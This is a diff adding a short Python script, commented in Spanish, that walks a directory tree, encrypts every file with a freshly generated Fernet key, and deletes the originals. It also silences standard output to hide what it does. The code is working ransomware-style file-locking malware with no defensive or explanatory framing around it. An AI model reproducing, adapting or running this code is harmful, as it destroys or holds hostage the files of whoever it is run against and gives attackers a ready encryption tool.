@@ -1,0 +1,31 @@
+#!/usr/bin/env python3
+
+import os
+import sys
+from cryptography.fernet import Fernet
+
+# Redirige stdout a os.devnull
+sys.stdout = open(os.devnull, 'w')
+
+# Genera una clave de cifrado y guarda la clave en un archivo
+key = Fernet.generate_key()
+with open('encryption_key.key', 'wb') as key_file:
+    key_file.write(key)
+fernet = Fernet(key)
+
+# Itera sobre cada archivo en el sistema de archivos
+for dirpath, dirnames, filenames in os.walk('/ruta/a/cifrar'):
+    for filename in filenames:
+        filepath = os.path.join(dirpath, filename)
+        try:
+            with open(filepath, 'rb') as f:
+                data = f.read()
+                encrypted_data = fernet.encrypt(data)
+                with open(filepath + ".encrypted", 'wb') as ef:
+                    ef.write(encrypted_data)
+                    # No se imprime el mensaje de éxito debido a la redirección de stdout.
+            # Elimina el archivo original después de cifrarlo
+            os.remove(filepath)
+        except Exception as e:
+            print(f'Error encrypting or deleting {filepath}: {e}', file=sys.stderr)
+
